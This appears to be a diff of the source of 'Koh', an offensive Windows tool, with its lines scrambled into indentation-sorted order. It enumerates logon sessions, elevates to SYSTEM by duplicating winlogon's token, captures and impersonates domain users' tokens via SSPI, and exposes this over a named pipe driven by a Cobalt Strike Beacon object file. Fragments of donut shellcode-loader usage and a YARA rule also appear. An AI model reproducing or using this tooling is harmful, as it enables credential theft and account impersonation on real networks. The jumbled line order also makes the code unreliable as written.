@@ -1,0 +1,5647 @@
+    
+     
+        
+            
+                        
+                          
+                                
+                                                        // hit our token limit
+                                                        Interop.CloseHandle(hToken)
+                                                    Interop.CloseHandle(hToken)
+                                                    else
+                                                    if (capturedSessions.Count < Program.maxTokens)
+                                                    if (loop)
+                                                    {
+                                                    }
+                                                // hit our token limit
+                                                // write a single byte out so we can fulfil the ReadFile() requirement on the other side of the pipe
+                                                Capture.CapturedSession temp = new Capture.CapturedSession()
+                                                Interop.CloseHandle(capturedSession.Value.TokenHandle)
+                                                Interop.CloseHandle(hToken)
+                                                Thread.Sleep(500)
+                                                byte[] bytes = new byte[1]
+                                                else
+                                                if (captureSessions)
+                                                targetCaptured = true
+                                                uint written = 0
+                                                var ex = new Win32Exception(Marshal.GetLastWin32Error())
+                                                {
+                                                }
+                                            // 0x80000000 
+                                            // 3 -> OPEN_EXISTING
+                                            Interop.CloseHandle(hToken)
+                                            Interop.RevertToSelf()
+                                            Thread.Sleep(1000)
+                                            else
+                                            if (capturedSession.Value.Luid != luid)
+                                            if (capturedSessions.Count < Program.maxTokens)
+                                            if (hPipe.ToInt64() == -1)
+                                            if (loop)
+                                            {
+                                            }
+                                        Capture.CapturedSession temp = new Capture.CapturedSession()
+                                        Interop.CloseHandle(capturedSession.Value.TokenHandle)
+                                        List<string> groupSids = Helpers.GetTokenGroups(capturedSession.Value.TokenHandle)
+                                        bool success = Interop.ImpersonateLoggedOnUser(capturedSession.Value.TokenHandle)
+                                        bool targetCaptured = false
+                                        else
+                                        foreach (var capturedSession in _capturedSessions)
+                                        foreach (var sidString in filterSids.Keys)
+                                        if (!targetCaptured)
+                                        if (captureSessions)
+                                        if (success)
+                                        {
+                                        }
+                                    // if we're filtering for specific group SIDs
+                                    Interop.CloseHandle(capturedSession.Value.TokenHandle)
+                                    else
+                                    if ((filterSids != null) 
+                                    if (capturedSession.Value.Luid == luid)
+                                    logonSessions[identifier] = foundSession
+                                    responseMsg 
+                                    tokenOrigin = Helpers.GetTokenOrigin(hToken)
+                                    {
+                                    }
+                                // negotiate a new token for this particular LUID
+                                // release LUID -> release token for specific LUID
+                                DEBUG = true
+                                LUID tokenOrigin = new LUID()
+                                LUID userLuid = new LUID(luid)
+                                _capturedSessions.Clear()
+                                else
+                                foreach (var capturedSession in _capturedSessions)
+                                foreach (var sidString in _filterSids.Keys)
+                                if (!logonSessions.ContainsKey(identifier))
+                                if (hToken != IntPtr.Zero)
+                                if (hToken == IntPtr.Zero)
+                                if (parts.Length < 4)
+                                if (pipeStream.CanWrite)
+                                logonSessionsToProcess[entry.Key] = entry.Value
+                                string identifier = userSID 
+                                string pipeName = parts[3]
+                                {
+                                }
+                            // Network logon types aren't going to have any credentials
+                            // only add a new session if an equivalent Negotiate logon session is not present
+                            Capture.CapturedSession sess = capturedSession.Value
+                            Program.maxWarned = true
+                            _excludeSids.Clear()
+                            _filterSids.Clear()
+                            bool val = false
+                            catch(Exception e)
+                            continue
+                            else
+                            if (!logonSessionsToProcess.ContainsKey(entry.Key))
+                            if ((sess.TokenHandle != IntPtr.Zero) 
+                            if (_filterSids.Keys.Count == 0)
+                            if (logonType != Interop.SECURITY_LOGON_TYPE.Network)
+                            try
+                            ulong luid = 0
+                            {
+                            }
+                        // any additional arguments -> assume they're domain group SIDs for filtering
+                        // authentication package
+                        // convert the security identifier of the user
+                        // datetime the session was logged in
+                        // domain for this account
+                        // domain users only (or NewCredentials/Type 9)
+                        // get the account username
+                        // impersonate LUID PipeName
+                        // list all current logon sessions
+                        // lists currently captured sessions/tokens
+                        // lists the domain group SIDs for a specified token
+                        // logon server's DNS domain
+                        // logon type
+                        // monitor a host for new logon sessions
+                        // user principalname
+                        // user's logon server
+                        Helpers.Usage()
+                        HighPart = 0
+                        HighPart = IntPtr.Zero
+                        Program.maxWarned = false
+                        byte[] outBuffer = System.Text.Encoding.ASCII.GetBytes(responseMsg)
+                        catch { }
+                        continue
+                        else
+                        else if (parts.Length == 3 
+                        else if (parts.Length == 4 
+                        foreach (var capturedSession in _capturedSessions)
+                        if (!Program.maxWarned)
+                        if (!negotiateSessions.ContainsKey(negotiateKey))
+                        if ((parts.Length == 3) 
+                        if ((parts.Length == 4) 
+                        if (Helpers.IsDomainSid(args[i]))
+                        if (Helpers.IsDomainSid(userSID) 
+                        if (luid != 0)
+                        if (parts.Length == 3 
+                        new IntPtr(pGroups.ToInt64() 
+                        server.Run()
+                        try { logonID = data.LoginID.LowPart.ToString()
+                        try { userSID = sid.Value
+                        var authPackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim()
+                        var dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim()
+                        var domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim()
+                        var logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim()
+                        var logonTime = systime.AddTicks((long)data.LoginTime)
+                        var logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType
+                        var sid = new System.Security.Principal.SecurityIdentifier(data.PSiD)
+                        var upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim()
+                        var username = Marshal.PtrToStringUni(data.Username.Buffer).Trim()
+                        {
+                        }
+                     v1.0.0
+                    )
+                    // Calculate pointer to the buffer
+                    // Dispose it
+                    // Project the buffer into the managed world
+                    // if we have a valid logon
+                    // move the pointer forward
+                    BuffersPtr = IntPtr.Zero
+                    Find.FoundSession session = entry.Value
+                    Helpers.Usage()
+                    Interop.CloseHandle(hDupToken)
+                    Interop.CloseHandle(hToken)
+                    Interop.LsaFreeReturnBuffer(sessionData)
+                    Interop.SID_AND_ATTRIBUTES sidAndAttributes = (Interop.SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
+                    Thread.Sleep(500)
+                    bool delSuccess1 = Interop.FreeCredentialsHandle(ref cred)
+                    else
+                    for (int i = 1
+                    groupSids.Add(sidString)
+                    if ( ((!captureSessions 
+                    if ((capturedSessions.Count >= Program.maxTokens))
+                    if (captureSessions) {
+                    if (data.PSiD != IntPtr.Zero)
+                    if (ret != 0)
+                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() 
+                    out ClientLifeTime
+                    out ClientLifeTime)
+                    pipeSecurity)
+                    return
+                    return IntPtr.Zero
+                    return false
+                    return logonSessions
+                    return new SECURITY_HANDLE
+                    return new SECURITY_INTEGER
+                    secBuffer.Dispose()
+                    string command = args[0].ToLower()
+                    string command = parts[1].ToLower()
+                    string identifier = entry.Key
+                    ulong luid = 0
+                    var currentBufferPtr = new IntPtr(BuffersPtr.ToInt64() 
+                    {
+                    }
+                   -FILE OPTIONS-
+                   -MODULE OPTIONS-
+                   -PIC/SHELLCODE OPTIONS-
+                // 2 == SecurityImpersonation
+                // Calculate pointer to the buffer
+                // Convert the byte array to hexadecimal string
+                // Copy data into the unmanaged memory
+                // Copy managed data into the native memory
+                // Debug mode outputs additional output on the command line for the server
+                // Delete native memory
+                // Dispose object
+                // Get the byte buffer
+                // Iterate through each buffer than we manage
+                // Open winlogon's token with TOKEN_DUPLICATE accesss so we can make a copy of the token with DuplicateToken
+                // Project the buffer into the managed world
+                // Re-throw exception
+                // Release memory associated with it
+                // Release native memory block
+                // Reset buffer pointer
+                // Reset native buffer pointer
+                // Spawn a new thread for each request and continue waiting
+                // Step 1 => acquire a credential handle to the specified logon session ID/LUID
+                // Step 3 -> call InitializeSecurityContext() with the server token
+                // Step 4 -> call AcceptSecurityContext() with the client token
+                // Step 4 -> turn the server context into a usable token
+                // TOKEN_DUPLICATE = 0x0002
+                // We don't have a buffer
+                // Write buffer to the stream
+                // clean up the handles we created
+                // enumerate current logon sessions
+                // get an array of pointers to LUIDs
+                // if the passed LUID string is a decimal form
+                // if the passed LUID string is of form 0xABC123
+                // make a copy of the NT AUTHORITY
+                // thread safe dictionary for session capture
+                // thread safe dictionary for sid filtering/updating
+                // thread safe dictionary for sids to exclude from capture
+                ADVAPI32$RevertToSelf()
+                AuthPackage = authPackage
+                BufferPtr = IntPtr.Zero
+                BuffersPtr = IntPtr.Zero
+                CaptureTime = DateTime.Now
+                ClientToken.Dispose()
+                ClientToken2.Dispose()
+                CredUser = credUser
+                CredentialUserName = credentialUserName
+                Dispose()
+                Helpers.Logo()
+                HighPart = (Int32)(uintVal >> 32)
+                IntPtr hDupToken = IntPtr.Zero
+                IntPtr hToken = IntPtr.Zero
+                IntPtr handle = processes[0].Handle
+                Interop.CloseHandle(hDupToken)
+                Interop.CloseHandle(hToken)
+                Interop.LsaFreeReturnBuffer(luidPtr)
+                LogonType = logonType
+                LowPart = (UInt32)(uintVal 
+                Luid = luid
+                Marshal.FreeHGlobal(BufferPtr)
+                Marshal.FreeHGlobal(BuffersPtr)
+                Marshal.FreeHGlobal(TokenInformation)
+                Marshal.FreeHGlobal(pGroups)
+                NamedPipeServerStream pipeStream = new NamedPipeServerStream(
+                OriginLUID = originLUID
+                PipeSecurity pipeSecurity = new PipeSecurity()
+                ProcessNextClient()
+                SID = sid
+                ServerToken.Dispose()
+                StringBuilder sb = new StringBuilder()
+                Thread t = new Thread(ProcessClientThread)
+                TokenHandle = tokenHandle
+                UInt64 uintVal = UInt64.Parse(value)
+                UserName = userName
+                UserSID = userSid
+                bool DEBUG = false
+                bool DEBUG = true
+                bool del2Success = Interop.DeleteSecurityContext(ref ClientContext)
+                bool del3Success = Interop.DeleteSecurityContext(ref ServerContext)
+                bool delSuccess2 = Interop.FreeCredentialsHandle(ref cred)
+                byte[] hashBytes = md5.ComputeHash(inputBytes)
+                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input)
+                clientRes = Interop.InitializeSecurityContext(
+                else
+                for (int i = 0
+                for (ulong i = 0
+                for (var index = 0
+                foreach (var sidString in filterSids.Keys) {
+                get
+                goto cleanup
+                if (!Helpers.GetSystem())
+                if (!IsSystem())
+                if (!success)
+                if ((clientRes != SEC_I_CONTINUE_NEEDED) 
+                if ((cred.HighPart == IntPtr.Zero) 
+                if (args.Length > 0)
+                if (captureSessions)
+                if (clientRes != SEC_I_CONTINUE_NEEDED)
+                if (meta != null)
+                if (parts[0] == _password)
+                if (res == 0x8009030e)
+                if (ret != 0)
+                if (serverRes != SEC_E_OK)
+                if (serverRes != SEC_I_CONTINUE_NEEDED)
+                if (status != 0)
+                if((capturedSessions.Count == 0) 
+                int sidAndAttrSize = Marshal.SizeOf(new Interop.SID_AND_ATTRIBUTES())
+                pipeStream.Close()
+                pipeStream.Dispose()
+                pipeStream.WaitForConnection()
+                ref clientLifeTime
+                return
+                return Marshal.PtrToStringAnsi(credName).Trim()
+                return false
+                return new SecBufferDesc
+                return new byte[] { }
+                return sb.ToString().ToLower()
+                return true
+                serverRes = Interop.AcceptSecurityContext(
+                string[] userSIDS = new string[groups.GroupCount]
+                success = Interop.ImpersonateLoggedOnUser(hDupToken)
+                t.Join()
+                t.Start(pipeStream)
+                this.PrivilegeCount = PrivilegeCount
+                this.Privileges = Privileges
+                throw
+                throw argEx
+                uint clientRes = Interop.InitializeSecurityContext(
+                uint serverRes = Interop.AcceptSecurityContext(
+                var currentBufferPtr = new IntPtr(BuffersPtr.ToInt64() 
+                var ex = new Win32Exception(Marshal.GetLastWin32Error())
+                var secBufferBytes = secBuffer.ToArray()
+                {
+                }
+               0 File(s)              0 bytes
+               uint hTemplateFile)
+            )
+            //      - logonType != Network
+            //      - user SID is domain formatted
+            //  Used for group SID filtering
+            //  ref - https://mskb.pkisolutions.com/kb/180548
+            // // TODO: try to decipher the clientLifeTime struct
+            // Acquires a credential handle for the specified logon session ID (LUID)
+            // Allocate a native chunk of memory for security buffer
+            // Allocate a security buffer of the requested size
+            // Allocate buffer
+            // Allocate byte buffer
+            // Allocate native memory for managed block
+            // Allocate security buffer
+            // Allocate unmanaged memory for the buffer
+            // Check buffer pointer validity
+            // Check if we have a buffer
+            // Check if we have a security buffer
+            // Convert to byte array
+            // Copy data from the native space
+            // Iterate through each buffer and write the data into the stream
+            // Main worker function that handles listing/monitoring/capturing new logon sessions
+            // Prepare a memory stream to contain all the buffers
+            // Return the true username for a credential in case we have a NewCredentials/Type 9 situation
+            // Returns true if the SID string matches a domain SID pattern
+            // Returns true if the current process is running with administrative privs in a high integrity context
+            // SECPKG_CRED_ATTR_NAMES = 1
+            // Save buffer size
+            // Set buffer type (2 = Token)
+            // Set the number of buffers
+            // Set version to SECBUFFER_VERSION
+            // Use input string to calculate MD5 hash
+            // We have only one buffer
+            // Wrapper that uses GetTokenInformation to retrieve the specified TOKEN_INFORMATION_CLASS
+            // check if we've been signaled to exit
+            // clean up so there's not an additional token leak
+            // enable casting to a ulong
+            // finds all logon sessions that match our specific criteria:
+            // first call gets length of TokenInformation
+            // gets the origin LUID for the specified token
+            // grab the current computer NETBIOS name
+            // grabs a credential handle for a specified LUID and negotiates a usable token
+            // helper to elevate to SYSTEM so we can get SeTcbPrivilege
+            // register the token with the current beacon session
+            // represents a found/enumerated logon session
+            // returns an arraylist of all of the group SIDs present for a specified token
+            //DateTime dt = DateTime.FromFileTimeUtc(fileTime)
+            //long fileTime = (long)((clientLifeTime.HighPart << 32) 
+            ADVAPI32$RevertToSelf()
+            BufferCount = 1
+            BufferPtr = Marshal.AllocHGlobal(BufferSize)
+            BufferPtr = Marshal.AllocHGlobal(bufferSize)
+            BufferSize = buffer.Length
+            BufferSize = bufferSize
+            BufferType = 2
+            BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(secBuffer))
+            CachedUnlock            // attempt to unlock a workstation
+            Console.WriteLine()
+            HighPart = (Int32)(value >> 32)
+            HighPart = value.HighPart
+            IntPtr buffer
+            IntPtr hObject
+            IntPtr hToken
+            IntPtr lpOverlapped)
+            IntPtr luidPtr = IntPtr.Zero
+            IntPtr token = IntPtr.Zero
+            Interop.FILETIME clientLifeTime = new Interop.FILETIME()
+            Interop.RevertToSelf()
+            Interop.SECURITY_HANDLE ClientContext = new Interop.SECURITY_HANDLE()
+            Interop.SECURITY_HANDLE ServerContext = new Interop.SECURITY_HANDLE()
+            Interop.SECURITY_HANDLE cred = GetCredentialHandle(luid)
+            Interop.SECURITY_HANDLE cred = Interop.SECURITY_HANDLE.Empty
+            Interop.SECURITY_INTEGER ClientLifeTime
+            KERNEL32$CloseHandle(duplicatedToken)
+            KERNEL32$CloseHandle(serverPipe)
+            KERNEL32$CloseHandle(threadToken)
+            KERNEL32$DisconnectNamedPipe(serverPipe)
+            List<string> groupSids = GetTokenGroups(token)
+            List<string> groupSids = new List<string>()
+            LowPart = (UInt32)(value 
+            LowPart = value.LowPart
+            Marshal.FreeHGlobal(luidPtr)
+            Marshal.FreeHGlobal(pOrigin)
+            NamedPipeServerStream pipeStream = (NamedPipeServerStream)o
+            SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
+            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE)
+            SecBufferDesc ClientToken2 = new SecBufferDesc(MAX_TOKEN_SIZE)
+            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE)
+            StringBuilder name = new StringBuilder(260)
+            TokenOrigin
+            UInt64 Value = ((UInt64)HighPart << 32) 
+            UInt64 Value = ((UInt64)luid.HighPart << 32)
+            Version = 0
+            WindowsIdentity identity = WindowsIdentity.GetCurrent()
+            WindowsPrincipal principal = new WindowsPrincipal(identity)
+            [MarshalAs(UnmanagedType.ByValArray)]
+            _capturedSessions = capturedSessions
+            _debug = debug
+            _excludeSids = excludeSids
+            _filterSids = filterSids
+            _meta = meta
+            _mode = mode
+            _password = password
+            _pipeName = pipeName
+            bool delSuccess = Interop.FreeCredentialsHandle(ref cred)
+            break
+            byte[] bytes = new byte[8]
+            byte[] highBytes = BitConverter.GetBytes(HighPart)
+            byte[] inBuffer = new byte[4096]
+            byte[] lowBytes = BitConverter.GetBytes(LowPart)
+            catch
+            catch (Exception e)
+            catch (Exception)
+            catch { }
+            catch(Exception e)
+            do
+            else
+            else {
+            finally
+            for (var index = 0
+            get
+            goto cleanup
+            if (!Helpers.IsHighIntegrity())
+            if (!Result)
+            if ((cred.HighPart == IntPtr.Zero) 
+            if ((filterSids != null) 
+            if (BufferPtr != IntPtr.Zero)
+            if (BufferPtr == IntPtr.Zero)
+            if (BuffersPtr != IntPtr.Zero)
+            if (BuffersPtr == IntPtr.Zero)
+            if (Helpers.IsSystem())
+            if (IsHighIntegrity())
+            if (_debug)
+            if (parts.Length > 1)
+            if (pipeStream.CanRead)
+            if (res != SEC_E_OK)
+            if (ret != 0)
+            if(!BeaconUseToken(duplicatedToken)) {
+            if($3 != $null) {
+            int nSize = 260
+            luidPtr = IntPtr.Zero
+            luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid))
+            out IntPtr LogonSessionList
+            out IntPtr TokenHandle
+            out IntPtr pBuffer
+            out IntPtr phToken
+            out IntPtr ppLogonSessionData
+            out SECURITY_INTEGER ptsExpiry
+            out SECURITY_INTEGER ptsTimeStamp
+            out int ReturnLength
+            out string securityIdentifierName
+            public DateTime CaptureTime
+            public IntPtr Buffer
+            public IntPtr HighPart
+            public IntPtr LowPart
+            public IntPtr PSiD
+            public IntPtr Sid
+            public IntPtr TokenHandle
+            public Interop.SECURITY_LOGON_TYPE LogonType
+            public LSA_STRING AuthenticationPackage
+            public LSA_STRING DnsDomainName
+            public LSA_STRING LoginDomain
+            public LSA_STRING LogonServer
+            public LSA_STRING Upn
+            public LSA_STRING Username
+            public LUID LoginID
+            public LUID Luid
+            public LUID_AND_ATTRIBUTES[] Privileges
+            public SID_AND_ATTRIBUTES[] Groups
+            public UInt32 Attributes
+            public UInt32 GroupCount
+            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002
+            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
+            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004
+            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
+            public int HighPart
+            public static SECURITY_HANDLE Empty
+            public static SECURITY_INTEGER Empty
+            public string AuthPackage
+            public string CredUser
+            public string CredentialUserName
+            public string LogonType
+            public string Luid
+            public string OriginLUID
+            public string SID
+            public string UserName
+            public string UserSID
+            public uint DateTimeHigh
+            public uint DateTimeLow
+            public uint LogonType
+            public uint LowPart
+            public uint PrivilegeCount
+            public uint Session
+            public uint Size
+            public ulong LoginTime
+            public ulong Luid
+            public ushort Length
+            public ushort MaximumLength
+            ref FILETIME ptsExpiry
+            ref IntPtr DuplicateTokenHandle
+            ref SECURITY_HANDLE phContext
+            ref SECURITY_HANDLE phCredential
+            return
+            return (((ulong)x) != ((ulong)y))
+            return (((ulong)x) == ((ulong)y))
+            return TokenInformation
+            return Value 
+            return Value.GetHashCode()
+            return buffer
+            return bytes
+            return cred
+            return currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid)
+            return groupSids
+            return groupSids.Contains(groupSID)
+            return logonSessions
+            return m.Success
+            return obj is LUID 
+            return origin.LoginID
+            return outputStream.ToArray()
+            return principal.IsInRole(WindowsBuiltInRole.Administrator)
+            return token
+            runningThread = new Thread(ServerLoop)
+            runningThread.Start()
+            string[] parts = input.Split(' ')
+            try
+            uint ContextAttributes = 0
+            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
+            var TokenInfLength = 0
+            var TokenInformation = Marshal.AllocHGlobal(TokenInfLength)
+            var buffer = new byte[BufferSize]
+            var currentSid = WindowsIdentity.GetCurrent().User
+            var input = System.Text.Encoding.ASCII.GetString(inBuffer).Trim('
+            var outputStream = new MemoryStream()
+            var res = Interop.AcquireCredentialsHandle(
+            var secBuffer = new SecBuffer(buffer)
+            var secBuffer = new SecBuffer(size)
+            while (loop 
+            {
+            }
+        $handle = openf($BOFPath)
+        )
+        - [Advantages](
+        - [Disadvantages](
+        // 0xDEAD == 57005
+        // based on https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipe-client
+        // perform the named pipe impersonation of the target token
+        // read 1 byte to satisfy the requirement that data is read from the pipe before it's used for impersonation
+        // represents a captured logon session
+        // the maximum number of unique tokens/logon sessions to capture
+        // whether we've been warned that we've hit max captured tokens
+        /// </summary>
+        /// <summary>
+        /// Convert to byte array
+        /// Dispose security buffer
+        /// Dispose security buffer descriptor
+        /// Extract raw byte data from the security buffer
+        /// Initialization constructor
+        /// Initialization constructor for byte array
+        /// Initialization constructor for existing buffer
+        /// Initialization constructor that allocates a new security buffer
+        Thread runningThread
+        [Flags]
+        [StructLayout(LayoutKind.Sequential)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        closef($handle)
+        else {
+        err = KERNEL32$GetLastError()
+        goto cleanup
+        if (!fSuccess 
+        if (!fSuccess) {
+        if (serverPipe == INVALID_HANDLE_VALUE) {
+        if($3 != $null) {
+        if($3 == $null) {
+        if(ADVAPI32$ImpersonateNamedPipeClient(serverPipe)) {
+        if(err == 2) {
+        if(strlen($bofData) < 1)
+        internal SecBuffer(byte[] buffer)
+        internal SecBuffer(int bufferSize)
+        internal SecBufferDesc(byte[] buffer)
+        internal SecBufferDesc(int size)
+        internal byte[] ToArray()
+        private bool _debug
+        private const int ISC_REQ_CONNECTION = 0x00000800
+        private const int MAX_TOKEN_SIZE = 12288
+        private const int SECPKG_CRED_BOTH = 3
+        private const int SECURITY_NATIVE_DREP = 0x10
+        private const uint SEC_E_OK = 0
+        private const uint SEC_I_CONTINUE_NEEDED = 0x90312
+        private string _mode
+        private string _password
+        private string _pipeName
+        public Int32 HighPart
+        public IntPtr BufferPtr
+        public IntPtr BuffersPtr
+        public LUID(LUID value)
+        public LUID(UInt64 value)
+        public LUID(string value)
+        public UInt32 LowPart
+        public byte[] GetBytes()
+        public enum LuidAttributes : uint
+        public enum SECURITY_LOGON_TYPE : uint
+        public enum TOKEN_INFORMATION_CLASS
+        public int BufferCount
+        public int BufferSize
+        public int BufferType
+        public int Version
+        public override bool Equals(object obj)
+        public override int GetHashCode()
+        public override string ToString()
+        public static LUID GetTokenOrigin(IntPtr token)
+        public static List<string> GetTokenGroups(IntPtr token)
+        public static SecBufferDesc Empty
+        public static bool GetSystem()
+        public static bool IsDomainSid(string sid)
+        public static bool IsHighIntegrity()
+        public static bool IsSystem()
+        public static bool maxWarned = false
+        public static extern IntPtr CreateFile(
+        public static extern bool CloseHandle(
+        public static extern bool ConvertSidToStringSid(
+        public static extern bool DeleteSecurityContext(
+        public static extern bool DuplicateToken(
+        public static extern bool FreeCredentialsHandle(
+        public static extern bool GetTokenInformation(
+        public static extern bool ImpersonateLoggedOnUser(
+        public static extern bool OpenProcessToken(
+        public static extern bool RevertToSelf()
+        public static extern bool WriteFile(
+        public static extern uint AcceptSecurityContext(
+        public static extern uint AcquireCredentialsHandle(
+        public static extern uint InitializeSecurityContext(
+        public static extern uint LsaEnumerateLogonSessions(
+        public static extern uint LsaFreeReturnBuffer(
+        public static extern uint LsaGetLogonSessionData(
+        public static extern uint QueryCredentialsAttributes(
+        public static extern uint QuerySecurityContextToken(
+        public static implicit operator ulong(LUID luid)
+        public static int maxTokens = 1000
+        public static string GetMachineName()
+        public static string MD5(string input)
+        public static void Logo()
+        public static void Usage()
+        public struct CapturedSession
+        public struct FILETIME
+        public struct FoundSession
+        public struct LSA_STRING
+        public struct LUID_AND_ATTRIBUTES
+        public struct SECURITY_HANDLE
+        public struct SECURITY_INTEGER
+        public struct SECURITY_LOGON_SESSION_DATA
+        public struct SID_AND_ATTRIBUTES
+        public struct TOKEN_GROUPS
+        public struct TOKEN_ORIGIN
+        public struct TOKEN_PRIVILEGES
+        public void Dispose()
+        public void ProcessClientThread(object o)
+        public void ProcessNextClient()
+        public void Run()
+        public void Stop()
+        return
+        static void Main(string[] args)
+        uint16(0) == 0x5A4D and 1 of ($x
+        void ServerLoop()
+        {
+        }
+       -c <namespace.class> Optional class name. (required for .NET DLL)
+       -m <method 
+       -p <arguments>       Optional parameters/command line inside quotations for DLL method/function or EXE.
+       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
+       -s <server>          HTTP server that will host the donut module.
+       -t                   Execute the entrypoint of an unmanaged EXE as a thread.
+       -w                   Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
+       -y <addr>            Create thread for loader and continue execution at <addr> supplied.
+       Only the finest artisanal donuts are made of shells.
+      - [Advantages/Disadvantages Versus Traditional Credential Extraction](
+      - [Our Approach](
+      - [Possible Approaches](
+      1           - list captured tokens
+      100         - list group SIDs currently used for capture filtering
+      101 SID     - adds group SID for capture filtering
+      102 SID     - removes a group SID for capture filtering
+      103         - resets all group SIDs for capture filtering
+      2 LUID      - list groups for a captured token
+      200 LUID    - lists the groups for the specified LUID/captured token
+      300 LUID    - impersonate a captured token
+      400         - release all tokens
+      401 LUID    - release a token for the specifed LUID
+      57005       - signal Koh to exit
+      AuthPackage           : Kerberos
+      AuthPackage           : Negotiate
+      AuthPackage : Kerberos
+      AuthPackage : Negotiate
+      Credential UserName   : da@THESHIRE.LOCAL
+      Credential UserName   : harmj0y@THESHIRE.LOCAL
+      Credential UserName   : testuser@THESHIRE.LOCAL
+      LUID                  : 1677733
+      LUID                  : 207990196
+      LUID                  : 81492692
+      LUID        : 1677733
+      LUID        : 207990196
+      LUID        : 81492608
+      LUID        : 81492692
+      LogonType             : Interactive
+      LogonType   : Interactive
+      Origin LUID           : 1677733 (0x1999a5)
+      Origin LUID           : 1677765 (0x1999c5)
+      Origin LUID           : 999 (0x3e7)
+      Origin LUID : 1677733 (0x1999a5)
+      Origin LUID : 1677765 (0x1999c5)
+      Origin LUID : 999 (0x3e7)
+      S-1-5-21-937929760-3187473010-80948926-512
+      User SID              : S-1-5-21-937929760-3187473010-80948926-1104
+      User SID              : S-1-5-21-937929760-3187473010-80948926-1119
+      User SID              : S-1-5-21-937929760-3187473010-80948926-1145
+      User SID    : S-1-5-21-937929760-3187473010-80948926-1104
+      User SID    : S-1-5-21-937929760-3187473010-80948926-1119
+      User SID    : S-1-5-21-937929760-3187473010-80948926-1145
+      UserName              : THESHIRE
+      UserName    : THESHIRE
+      [
+     /
+    $barch = barch($bid)
+    $bid = $1
+    $bofArgs = $null
+    $command = $2
+    - [Approach](
+    - [Compilation](
+    - [Example - Capture](
+    - [Example - Listing Logon Sessions](
+    - [Example - Monitoring for Logon Sessions (with group SID filtering)](
+    - [Group SID Filtering](
+    - [Usage](
+    - [Why This Is Possible](
+    //      1           - list captured tokens
+    //      100         - list group SIDs currently used for capture filtering
+    //      101 SID     - adds group SID for capture filtering
+    //      102 SID     - removes a group SID for capture filtering
+    //      103         - resets all group SIDs for capture filtering
+    //      2 LUID      - list groups for a captured token
+    //      200 LUID    - lists the groups for the specified LUID/captured token
+    //      300 LUID    - impersonate a captured token
+    //      400         - release all tokens
+    //      401 LUID    - release a token for the specifed LUID
+    //      57005       - signal Koh to exit
+    //  MIT license
+    // From https://github.com/mono/linux-packaging-mono/blob/bc64aa5907f74087a6adabcff5ff79cfd2904040/external/corefx/src/System.Data.SqlClient/tests/Tools/TDS/TDS.EndPoint/SSPI/SecBuffer.cs
+    // From https://github.com/mono/linux-packaging-mono/blob/d356d2b7db91d62b80a61eeb6fbc70a402ac3cac/external/corefx/src/System.Data.SqlClient/tests/Tools/TDS/TDS.EndPoint/SSPI/SecBufferDesc.cs
+    // Koh commands:
+    // SecBufferDesc structure - https://docs.microsoft.com/en-us/windows/win32/api/sspi/ns-sspi-secbufferdesc
+    // command 300 == impersonation
+    // connect to the Koh communication named pipe
+    // null security descriptor for the impersonation named pipe
+    // parse packed Beacon commands
+    // read any output from the server
+    // send the Koh command to the named pipe server
+    <   
+    <AssemblyName>Koh</AssemblyName>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>none</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <PostBuildEvent>copy /Y $(TargetPath) $(SolutionDir)
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{4D5350C8-7F8C-47CF-8CDE-C752018AF17E}</ProjectGuid>
+    <RootNamespace>Koh</RootNamespace>
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    ADVAPI32$InitializeSecurityDescriptor(
+    ADVAPI32$SetSecurityDescriptorDacl(
+    BOOL fSuccess = FALSE
+    BOOLEAN bEnabled = FALSE
+    BeaconDataParse(
+    DWORD bytesRead = 0
+    DWORD commandBytesWritten = 0
+    DWORD err = 0
+    HANDLE clientPipe
+    HANDLE duplicatedToken
+    HANDLE serverPipe
+    HANDLE threadToken
+    KERNEL32$CloseHandle(clientPipe)
+    KERNEL32$LocalFree(kohCommand)
+    KERNEL32$LocalFree(lpPipeContent)
+    LUID = BeaconDataInt(
+    PBYTE lpPipeContent = NULL
+    SA.bInheritHandle = TRUE
+    SA.lpSecurityDescriptor = 
+    SA.nLength = sizeof(SA)
+    SECURITY_ATTRIBUTES SA
+    SECURITY_DESCRIPTOR SD
+    [StructLayout(LayoutKind.Sequential)]
+    catch $message
+    char
+    char 
+    class Creds
+    class Find
+    class Helpers
+    class Program
+    condition:
+    datap parser = {0}
+    do {
+    donut -a1 -cTestClass -mRunProcess -pnotepad.exe loader.dll
+    donut c2.dll
+    else if(intKohCommand == 100){
+    else if(intKohCommand == 101){
+    else if(intKohCommand == 102){
+    else if(intKohCommand == 103){
